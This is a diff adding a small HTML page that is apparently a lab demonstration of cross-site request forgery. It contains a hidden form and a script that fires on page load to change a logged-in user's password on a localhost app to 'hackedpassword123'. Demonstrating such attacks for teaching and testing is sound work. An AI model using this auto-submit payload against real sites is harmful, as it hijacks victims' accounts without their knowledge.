@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Attack Simulation</title>
+</head>
+
+<body>
+  <h2>CSRF Attack Demo</h2>
+  <p>If you are logged into the application, this will attempt to change your password to 'hackedpassword123'.</p>
+
+  <form id="csrfForm" action="http://localhost:3000/change-password" method="POST">
+    <input type="hidden" name="newPassword" value="hackedpassword123">
+  </form>
+
+  <script>
+    // Automatically submit the form to initiate the CSRF attack
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+
+</html>
